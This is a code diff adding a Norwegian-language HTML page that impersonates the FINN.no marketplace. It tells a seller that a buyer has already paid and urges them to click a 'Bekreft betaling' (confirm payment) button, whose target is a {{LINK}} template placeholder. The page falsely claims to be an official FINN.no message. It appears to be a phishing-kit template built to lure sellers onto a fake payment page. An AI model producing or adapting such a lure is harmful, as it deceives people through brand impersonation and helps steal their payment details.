@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="no">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FINN - Betaling fullført</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background: linear-gradient(135deg, #f4f5f7 0%, #e8eaed 100%);
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .header-logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo-text {
+            font-size: 48px;
+            font-weight: 900;
+            color: #0063fb;
+            letter-spacing: 3px;
+            text-shadow: 0 2px 4px rgba(0,99,251,0.2);
+        }
+        .finn-card {
+            background: #ffffff;
+            padding: 45px 40px;
+            max-width: 520px;
+            width: 100%;
+            border-radius: 12px;
+            box-shadow: 0 4px 24px rgba(0,0,0,0.12);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .finn-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 6px;
+            background: linear-gradient(90deg, #0063fb 0%, #06befb 100%);
+        }
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #0063fb 0%, #06befb 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+            box-shadow: 0 4px 16px rgba(0,99,251,0.3);
+        }
+        .success-icon svg {
+            width: 45px;
+            height: 45px;
+            fill: white;
+        }
+        .finn-card h2 {
+            color: #474445;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            line-height: 1.3;
+        }
+        .highlight {
+            color: #0063fb;
+        }
+        .finn-card p {
+            color: #767676;
+            font-size: 16px;
+            line-height: 1.7;
+            margin-bottom: 16px;
+        }
+        .finn-card p:first-of-type {
+            font-weight: 600;
+            color: #474445;
+        }
+        .info-box {
+            background: #f0f9ff;
+            border-left: 4px solid #0063fb;
+            padding: 16px;
+            margin: 25px 0;
+            border-radius: 6px;
+            text-align: left;
+        }
+        .info-box p {
+            margin: 0;
+            font-size: 15px;
+            color: #474445;
+        }
+        .finn-button {
+            margin-top: 30px;
+            background: linear-gradient(135deg, #0063fb 0%, #0055d4 100%);
+            color: #ffffff;
+            padding: 16px 40px;
+            border: none;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: 700;
+            text-decoration: none;
+            display: inline-block;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0,99,251,0.3);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .finn-button:hover {
+            background: linear-gradient(135deg, #0055d4 0%, #0046b8 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0,99,251,0.4);
+        }
+        .finn-button:active {
+            transform: translateY(0);
+        }
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 25px;
+            padding-top: 25px;
+            border-top: 1px solid #e8eaed;
+            font-size: 14px;
+            color: #767676;
+        }
+        .footer-text {
+            text-align: center;
+            margin-top: 25px;
+            font-size: 13px;
+            color: #999;
+            max-width: 520px;
+        }
+        .footer-text a {
+            color: #0063fb;
+            text-decoration: none;
+        }
+        .footer-text a:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 600px) {
+            body { padding: 15px; }
+            .logo-text { font-size: 36px; }
+            .finn-card { padding: 35px 25px; }
+            .finn-card h2 { font-size: 24px; }
+            .finn-button { width: 100%; padding: 16px 20px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="header-logo">
+        <div class="logo-text">FINN</div>
+    </div>
+    <div class="finn-card">
+        <div class="success-icon">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
+            </svg>
+        </div>
+        <h2>Bekreft <span class="highlight">betaling</span></h2>
+        <p>Hei!</p>
+        <div class="info-box">
+            <p><strong>Kjøperen har allerede betalt for varen din via FINN.</strong></p>
+        </div>
+        <p>For å bekrefte og motta betalingen, vennligst klikk på knappen nedenfor og følg instruksjonene.</p>
+        <p>Dette tar bare noen få sekunder, og betalingen vil bli overført til din konto umiddelbart etter bekreftelse.</p>
+        <a href="{{LINK}}" class="finn-button">Bekreft betaling</a>
+        <div class="security-badge">Sikker betaling via FINN</div>
+    </div>
+    <div class="footer-text">
+        Dette er en offisiell melding fra FINN.no<br>
+        <a href="#">Kundeservice</a> &bull; <a href="#">Personvern</a> &bull; <a href="#">Vilkår</a>
+    </div>
+</body>
+</html>
